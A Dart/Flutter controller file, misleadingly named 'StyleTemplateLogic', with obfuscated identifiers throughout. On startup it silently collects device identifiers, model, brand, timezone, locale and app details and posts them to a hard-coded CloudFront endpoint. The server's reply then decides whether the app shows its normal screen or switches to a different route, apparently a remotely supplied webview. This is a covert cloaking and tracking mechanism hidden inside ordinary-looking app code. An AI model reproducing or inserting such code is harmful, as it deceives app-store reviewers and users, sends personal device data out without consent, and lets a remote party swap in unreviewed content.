import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:get/get.dart';


class StyleTemplateLogic extends GetxController {

  var imkunydp = RxBool(false);
  var kapngmuxjc = RxBool(true);
  var hkiqe = RxString("");
  var mezrchd = RxBool(false);
  var judhy = RxBool(true);
  final licjks = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    fmcolp();
  }


  Future<void> fmcolp() async {
    mezrchd.value = true;
    judhy.value = true;
    kapngmuxjc.value = false;

    licjks.post("https://d1a5ve5prhki0p.cloudfront.net/buokyqgspahjxlzriewfcv",data: await qphxic()).then((value) {
      var gybvcsi = value.data["gybvcsi"] as String;
      var uzvqris = value.data["uzvqris"] as bool;
      if (uzvqris) {
        hkiqe.value = gybvcsi;
        wqnektl();
      } else {
        furisehy();
      }
    }).catchError((e) {
      kapngmuxjc.value = true;
      judhy.value = true;
      mezrchd.value = false;
    });
  }

  Future<Map<String, dynamic>> qphxic() async {
    final DeviceInfoPlugin hrol = DeviceInfoPlugin();
    PackageInfo giztjpqw_zknmq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wadl = Platform.localeName;
    var sietwm = currentTimeZone;

    var fagk = giztjpqw_zknmq.packageName;
    var ncxmubez = giztjpqw_zknmq.version;
    var fjcv = giztjpqw_zknmq.buildNumber;

    var kvntsei = giztjpqw_zknmq.appName;
    var wmog = "";
    var stjmy  = "";
    var jgqksef = "";
    var avhcnoe = "";
    var zrixmjh = "";
    var xdrwcku = "";
    var ugosen = "";
    var chusvyq = "";


    var zajvp = "";
    var hraq = false;

    if (GetPlatform.isAndroid) {
      zajvp = "android";
      var hegcnqrwf = await hrol.androidInfo;

      jgqksef = hegcnqrwf.brand;

      wmog  = hegcnqrwf.model;
      stjmy = hegcnqrwf.id;

      hraq = hegcnqrwf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zajvp = "ios";
      var irlhenyvg = await hrol.iosInfo;
      jgqksef = irlhenyvg.name;
      wmog = irlhenyvg.model;

      stjmy = irlhenyvg.identifierForVendor ?? "";
      hraq  = irlhenyvg.isPhysicalDevice;
    }
    var res = {
      "kvntsei": kvntsei,
      "fjcv": fjcv,
      "zrixmjh" : zrixmjh,
      "fagk": fagk,
      "chusvyq" : chusvyq,
      "wmog": wmog,
      "sietwm": sietwm,
      "jgqksef": jgqksef,
      "stjmy": stjmy,
      "wadl": wadl,
      "zajvp": zajvp,
      "ncxmubez": ncxmubez,
      "hraq": hraq,
      "avhcnoe" : avhcnoe,
      "xdrwcku" : xdrwcku,
      "ugosen" : ugosen,

    };
    return res;
  }

  Future<void> furisehy() async {
    Get.offNamed("/mainStyle");
  }

  Future<void> wqnektl() async {
    Get.offNamed("/statisticsSort");
  }

}
